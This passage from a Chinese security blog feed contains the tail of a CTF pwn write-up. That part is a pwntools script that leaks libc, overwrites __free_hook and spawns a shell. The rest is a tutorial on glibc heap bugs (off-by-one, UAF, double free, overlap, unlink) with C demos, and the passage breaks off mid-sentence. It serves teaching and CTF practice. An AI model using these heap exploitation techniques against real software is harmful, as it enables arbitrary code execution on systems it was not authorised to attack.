将C块的inuse位给清了</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#填满tcache</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment">#促使块合并，但块8还在使用</span></span><br><span class="line"><span class="comment">#step3: leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"> add(<span class="number">0x8</span>, p64(i))</span><br><span class="line">add(<span class="number">0x8</span> ,p64(<span class="number">7</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.success((hex(libc_base)))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">target = libc.symbols[<span class="string">"__free_hook"</span>] + libc_base</span><br><span class="line">log.success(hex(target))</span><br><span class="line">sys_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">one_addr = libc_base + <span class="number">0x4f432</span> <span class="comment">#0x4f2c5 </span></span><br><span class="line">add(<span class="number">0x10</span>, p64(target))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(one_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面几个堆题有一个上次新生赛的原题，但就是做不出来</p><p>堆的东西还是不太熟悉，我tcl</p><p>马上考试了，先去复习了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CUMTCTF2020岁末赛&quot;&gt;&lt;a href=&quot;#CUMTCTF2020岁末赛&quot; class=&quot;headerlink&quot; title=&quot;CUMTCTF2020岁末赛&quot;&gt;&lt;/a&gt;CUMTCTF2020岁末赛&lt;/h1&gt;&lt;p&gt;学长们可太搞了，比赛最后垂直上分可太秀了&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="https://pz1o.top/categories/wp/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>堆漏洞及其利用</title>
    <link href="https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/"/>
    <id>https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/</id>
    <published>2020-12-22T13:17:06.000Z</published>
    <updated>2021-02-06T07:06:55.326Z</updated>
    
    <content type="html"><![CDATA[<p>堆基础和堆漏洞还是分开比较好</p><p>这样看着也比较整齐</p><h1 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h1><h2 id="0x01-Off-By-One"><a href="#0x01-Off-By-One" class="headerlink" title="0x01 Off By One"></a>0x01 Off By One</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。</p><h3 id="2-利用思路"><a href="#2-利用思路" class="headerlink" title="2.利用思路"></a>2.利用思路</h3><p>(1) 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</p><p>(2) 溢出字节为 NULL 字节：溢出的一个字节恰好覆盖下一堆块的size域的最低位，将PREV_INUSE位置0，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理(后面将详细介绍)，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。</p><h3 id="3-演示"><a href="#3-演示" class="headerlink" title="3.演示"></a>3.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);<span class="comment">//断点</span></span><br><span class="line">    gets(<span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">buffer</span>)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个程序的问题在于strlen 在计算长度的时候不会把结束符 ‘\x00’ 计算在内，但strcpy 在拷贝的时候会把 ‘\x00’ 也算上，所以就会造成 off by one。</p><p>我们先来调试一下</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219141904042.png" alt="image-20201219141904042"></p><p>直接看堆情况 分配24字节上面为什么堆size为0x21也就是33字节 这个可以看上面的</p><p>因为它会把下面一个pre_size占用</p><p>输入24个A</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219142302977.png" alt="image-20201219142302977"></p><p>可以很直观的看到确实是溢出了一个字节</p></blockquote><h2 id="0x02-Use-After-Free"><a href="#0x02-Use-After-Free" class="headerlink" title="0x02 Use After Free"></a>0x02 Use After Free</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1.概念"></a>1.概念</h3><p>Use After Free(UAF)即释放后使用漏洞。若堆指针在释放后未置空，形成悬挂指针，当下次访问该指针时，依然能够访问原指针所指向的堆内容，形成漏洞。</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><h3 id="3-演示-1"><a href="#3-演示-1" class="headerlink" title="3.演示"></a>3.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*func_ptr)</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys1</span><span class="params">(<span class="keyword">char</span> command[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span> content[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//申请了4个int大小的内存</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//因为前2个也就是0x10是用来管理chunk的</span></span><br><span class="line">    p1[<span class="number">2</span>]=echo;<span class="comment">//所以从第三个开始</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello again\n"</span>); <span class="comment">//p1指针未被置空,虽然free了,但仍可使用.</span></span><br><span class="line">    func_ptr *p2=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="comment">//free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//p2与p1指针指向的内存为同一地址</span></span><br><span class="line">    p2[<span class="number">2</span>]=sys1; <span class="comment">//在这里将p1指针里面保存的echo函数指针覆盖成为了sys1指针.</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们可以看到这个p1和p2的地址是相同的</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219145625345.png" alt="image-20201219145625345"></p></blockquote><h2 id="0x03-Double-Free"><a href="#0x03-Double-Free" class="headerlink" title="0x03 Double Free"></a>0x03 Double Free</h2><h3 id="1-概念-2"><a href="#1-概念-2" class="headerlink" title="1.概念"></a>1.概念</h3><p>Double Free是UAF较为特殊的一种</p><h3 id="2-演示"><a href="#2-演示" class="headerlink" title="2.演示"></a>2.演示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(d, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4st malloc(9) %p points to %s the first time\n"</span>, d, d);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s the second time\n"</span>, f, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160532780.png" alt="image-20201219160532780"></p><p>直接根据输出理解其中的原理 也就是我上面画的这个图</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160630662.png" alt="image-20201219160630662"></p></blockquote><h2 id="0x04-overlap"><a href="#0x04-overlap" class="headerlink" title="0x04 overlap"></a>0x04 overlap</h2><h3 id="1-概念-3"><a href="#1-概念-3" class="headerlink" title="1.概念"></a>1.概念</h3><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。</p><h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h3 id="3-演示1（fastbin）"><a href="#3-演示1（fastbin）" class="headerlink" title="3.演示1（fastbin）"></a>3.演示1（fastbin）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//斷點</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接打断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214608484.png" alt="image-20201219214608484"></p><p>可以看到分配了两个</p><p>这时我们把p1的size位改变再进行释放，就会进入fastbin中</p><p>继续分配我们就可以把p2的数据改变</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214801301.png" alt="image-20201219214801301"></p><p>fastbin如我们所料</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214832357.png" alt="image-20201219214832357"></p><p>演示完成 这时我们就可以改变p2的数据</p></blockquote><h3 id="4-演示2（smallbin）"><a href="#4-演示2（smallbin）" class="headerlink" title="4.演示2（smallbin）"></a>4.演示2（smallbin）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215247031.png" alt="image-20201219215247031"></p><p>修改size值之后 释放 进入unsortedbin中</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215357168.png" alt="image-20201219215357168"></p><p>继续分配</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219215517292.png" alt="image-20201219215517292"></p><p>我们这样就可以直接修改数据了</p></blockquote><h3 id="5-演示3（向前overlap）"><a href="#5-演示3（向前overlap）" class="headerlink" title="5.演示3（向前overlap）"></a>5.演示3（向前overlap）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219220938551.png" alt="image-20201219220938551"></p><p>修改指针后</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221233429.png" alt="image-20201219221233429"></p><p>此时释放p4  进入unsortedbin中 如果进行分配 那么我们就可以向前overlap</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221322641.png" alt="image-20201219221322641"></p><p>我们最后来分配一下</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219221445409.png" alt="image-20201219221445409"></p></blockquote><h2 id="0x05-unlink"><a href="#0x05-unlink" class="headerlink" title="0x05 unlink"></a>0x05 unlink</h2><h3 id="1-概念-4"><a href="#1-概念-4" class="headerlink" title="1.概念"></a>1.概念</h3><ul><li>双向链表中移除/添加一个chunk时，会发生断链的操作，这个断链的过程就叫做unlink</li><li>注意事项：unlink不发生在fastbin和smallbin中，所以fastbin和smallbin容易产生漏洞</li></ul><h3 id="2-发生场景"><a href="#2-发生场景" class="headerlink" title="2.发生场景"></a>2.发生场景</h3><p><strong>malloc时：</strong></p><ul><li>从恰好大小合适的largebin中获取chunk，发生unlink</li><li>从比malloc要求大的largebin中取chunk，发生unlink</li></ul><p><strong>free时：</strong></p><ul><li>free之后，与前后空闲的chunk进行合并</li></ul><p><strong>malloc consolidate时：</strong></p><ul><li>consolidate时，chunk之间的unlink</li></ul><p><strong>realloc时：</strong></p><ul><li>向前扩展，合并物理相邻高地址空闲chunk</li></ul><h3 id="3-古老的unlink"><a href="#3-古老的unlink" class="headerlink" title="3.古老的unlink"></a>3.古老的unlink</h3><p>其中P为需要释放/添加的chunk</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unlink_smallbin_intro.png" alt="img"></p><p>unlink的代码</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/JgR9imeK6YMQ2rZ.png" alt="image-20200723164353967"></p><blockquote><p>(1)将前一个chunk占用的内存合并到当前chunk;</p><p>(2)修改指向当前chunk的指针，改为指向前一个chunk。</p><p>(3)使用unlink宏，将前一个free chunk从双向循环链表中移除</p></blockquote><p>此例来自ctf-wiki</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/old_unlink_vul.png" alt="img"></p><p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><p><strong>以下12和8都是对于32位来说的</strong></p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li></ul><p>这张图片应该更好理解</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/BTQOKLG2XSyHqge.png" alt="image-20200723165236574"></p><h3 id="4-新的unlink"><a href="#4-新的unlink" class="headerlink" title="4.新的unlink"></a>4.新的unlink</h3><p>新版的unlink加入了下面这部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure><p>如果不指向P，那么就出现了问题</p><p>那如何利用呢？</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 